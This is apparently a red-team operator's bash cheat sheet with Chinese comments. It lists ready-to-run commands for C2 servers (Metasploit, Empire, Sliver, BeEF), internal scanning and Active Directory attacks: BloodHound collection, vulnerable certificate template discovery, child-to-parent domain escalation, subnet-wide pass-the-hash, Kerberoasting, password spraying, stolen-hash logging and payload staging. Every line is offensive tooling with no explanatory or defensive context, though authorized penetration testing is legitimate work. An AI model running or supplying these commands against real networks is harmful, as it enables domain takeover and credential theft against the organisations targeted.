```bash
msfconsole                        # Metasploit(数据库已就绪)

~/tools/bin/fscan -h <目标>        # 内网一键扫描
~/tools/bin/ligolo_proxy          # 隧道控制端
nuclei -u https://<目标> -severity critical,high   # 漏扫

sudo beef-xss                     # BeEF 面板 127.0.0.1:3000
sudo powershell-empire server     # Empire 团队服务器(Starkiller 见 03 文档)
sliver-server                    # Sliver C2
bloodhound-python -u u -p 'p' -d <域> -dc <DC> -ns <DCIP> -c All --zip   # BH 采集(平台 http://127.0.0.1:8080)
certipy find -u <用户>@<域> -p '<密码>' -dc-ip <DC> -vulnerable          # ADCS 摸底
impacket-raiseChild '<子域>/<DA>:<密码>' -w child2parent.ccache          # 子域→父域一键
nxc smb <网段>/24 -u administrator -H <NT> --local-auth --continue-on-success   # 工作组哈希碰撞
# ===== 自动化脚本(~/tools/bin,均为实测可执行) =====
sudo ~/tools/bin/domain-setup.sh <域> <DC IP> [FQDN] [用户] [密码]   # 接入准备:对时+DNS+krb5+kinit 一步完成
~/tools/bin/ad-sweep.sh <网段>/24 [DC IP] [用户] [密码]              # 一把梭:签名+relay清单+枚举+AS-REP/Kerberoast → ~/tools/loot/
~/tools/bin/spray-safe.sh <DC IP> users.txt [验证用户] [验证密码] [密码]  # 安全喷洒:自动读锁定策略节流防锁号
~/tools/bin/log-cred.sh NT哈希 'TEST\svc' TEST.LOCAL '值' '来源'     # 凭据台账一键登记(~/tools/loot/creds.csv)
~/tools/bin/make-stage.sh                                            # Windows 落地件打包 zip+SHA256,附 SMB 传输命令
```
